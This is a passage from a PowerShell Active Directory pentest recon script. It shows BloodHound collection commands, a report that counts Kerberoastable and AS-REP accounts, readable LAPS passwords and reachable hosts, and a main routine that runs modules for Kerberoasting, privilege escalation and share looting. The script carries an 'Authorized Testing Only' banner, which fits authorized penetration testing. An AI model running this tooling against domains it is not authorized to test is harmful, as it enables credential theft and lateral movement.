        Write-Warn "Recommend: Bring SharpHound.exe or SharpHound.ps1 on USB"
        Write-Warn "Alternative: Run bloodhound-python from your own machine if network allows"
        
        # Save manual instructions
        $instructions = @(
            "=== BLOODHOUND MANUAL COLLECTION ==="
            ""
            "Option 1: SharpHound.exe (preferred on Windows)"
            "  .\SharpHound.exe --collectionmethods All --zipfilename data.zip"
            ""
            "Option 2: SharpHound.ps1"
            "  Import-Module .\SharpHound.ps1"
            "  Invoke-BloodHound -CollectionMethod All"
            ""
            "Option 3: bloodhound-python (from Kali/your machine)"
            "  bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All --zip"
        )
        Save-Output "bloodhound_instructions.txt" $instructions "bloodhound"
    }
}

# ========================== FINAL REPORT ==========================

function Generate-Report {
    Write-Banner "GENERATING FINAL REPORT"

    $report = @()
    $report += "================================================================"
    $report += "  AD INTERNAL PENTEST — WINDOWS NATIVE RECON REPORT"
    $report += "  Generated : $(Get-Date)"
    $report += "  Domain    : $Domain"
    $report += "  DC        : $LogonServer"
    $report += "  User      : $env:USERDOMAIN\$env:USERNAME"
    $report += "  Machine   : $env:COMPUTERNAME"
    $report += "================================================================"
    $report += ""

    # Summarize key findings
    $report += "=== KEY FINDINGS ==="
    $report += ""

    # DA count
    $daFile = Join-Path $BaseDir "enumeration\domain_admins.txt"
    if (Test-Path $daFile) {
        $daCount = (Get-Content $daFile | Where-Object { $_ -match 'CN=' }).Count
        $report += "[*] Domain Admins: $daCount members"
    }

    # SPN accounts
    $spnFile = Join-Path $BaseDir "enumeration\spn_accounts.txt"
    if (Test-Path $spnFile) {
        $spnCount = (Get-Content $spnFile | Where-Object { $_ -match '^Account' }).Count
        $report += "[*] Kerberoastable accounts: $spnCount"
    }

    # ASREP
    $asrepFile = Join-Path $BaseDir "enumeration\asrep_candidates.txt"
    if (Test-Path $asrepFile) {
        $report += "[*] AS-REP candidates: $(Get-Content $asrepFile | Where-Object { $_ -match '^\s+\S' -and $_ -notmatch 'None|Query|===' } | Measure-Object | Select-Object -ExpandProperty Count)"
    }

    # LAPS
    $lapsFile = Join-Path $BaseDir "privesc\laps_check.txt"
    if (Test-Path $lapsFile) {
        if (Select-String -Path $lapsFile -Pattern "PASSWORD:" -Quiet) {
            $report += "[!!!] LAPS passwords READABLE"
        }
    }

    # Local admin hosts
    $accessFile = Join-Path $BaseDir "access\access_map.txt"
    if (Test-Path $accessFile) {
        $smbCount = (Get-Content $accessFile | Where-Object { $_ -match 'SMB:True' }).Count
        $winrmCount = (Get-Content $accessFile | Where-Object { $_ -match 'WinRM:True' }).Count
        $report += "[*] SMB reachable hosts : $smbCount"
        $report += "[*] WinRM reachable hosts: $winrmCount"
    }

    # Interesting files
    $filesFile = Join-Path $BaseDir "shares\interesting_files.txt"
    if (Test-Path $filesFile) {
        $intFiles = (Get-Content $filesFile | Where-Object { $_ -match '^\s+\[!\]' }).Count
        $report += "[*] Interesting files on shares: $intFiles"
    }

    $report += ""
    $report += "=== OUTPUT STRUCTURE ==="
    $report += "  $BaseDir\enumeration\  — AD users, groups, SPNs, delegation"
    $report += "  $BaseDir\credentials\  — Kerberoast/ASREP hashes"
    $report += "  $BaseDir\access\       — Network access map"
    $report += "  $BaseDir\shares\       — Share enum, interesting files, GPP"
    $report += "  $BaseDir\lateral\      — Lateral movement options"
    $report += "  $BaseDir\privesc\      — PrivEsc checks, LAPS, ADCS"
    $report += "  $BaseDir\bloodhound\   — BloodHound collection data"
    $report += "  $BaseDir\localrecon\   — Local machine intel, AV, creds"
    $report += ""
    $report += "================================================================"

    $reportPath = Join-Path $BaseDir "REPORT.txt"
    $report | Out-File -FilePath $reportPath -Encoding UTF8
    Write-Info "Report saved -> $reportPath"
    
    # Display report
    $report | ForEach-Object { Write-Host $_ }
}

# ========================== MAIN ==========================

function Main {
    Write-Host ""
    Write-Host "  ╔═══════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "  ║   AD INTERNAL RECON — WINDOWS NATIVE         ║" -ForegroundColor Red
    Write-Host "  ║   No External Tools Required                  ║" -ForegroundColor Red
    Write-Host "  ║   Authorized Testing Only                     ║" -ForegroundColor Red
    Write-Host "  ╚═══════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""

    Write-Info "Domain    : $Domain"
    Write-Info "User      : $env:USERDOMAIN\$env:USERNAME"
    Write-Info "DC        : $LogonServer"
    Write-Info "Machine   : $env:COMPUTERNAME"
    Write-Info "Tools Path: $(if($ToolsPath){"$ToolsPath"}else{'None (native only)'})"
    Write-Host ""

    Setup-Directories

    Mod-LocalRecon     # Module 0: Where are we, what's watching us
    Mod-Validate       # Module 1: Domain connectivity
    Mod-Enumerate      # Module 2: Full AD enumeration
    Mod-Kerberoast     # Module 3: Native Kerberoasting
    Mod-AccessMap      # Module 4: Network access mapping
    Mod-Shares         # Module 5: Share enum + sensitive files
    Mod-PrivEsc        # Module 6: Privilege escalation checks
    Mod-BloodHound     # Module 7: BloodHound (if tools available)
    
    Generate-Report

    Write-Banner "COMPLETE"
    Write-Info "All results saved to: $BaseDir"
    Write-Info "Transfer this folder off the machine for analysis"
    Write-Host ""
}

# Execute
Main
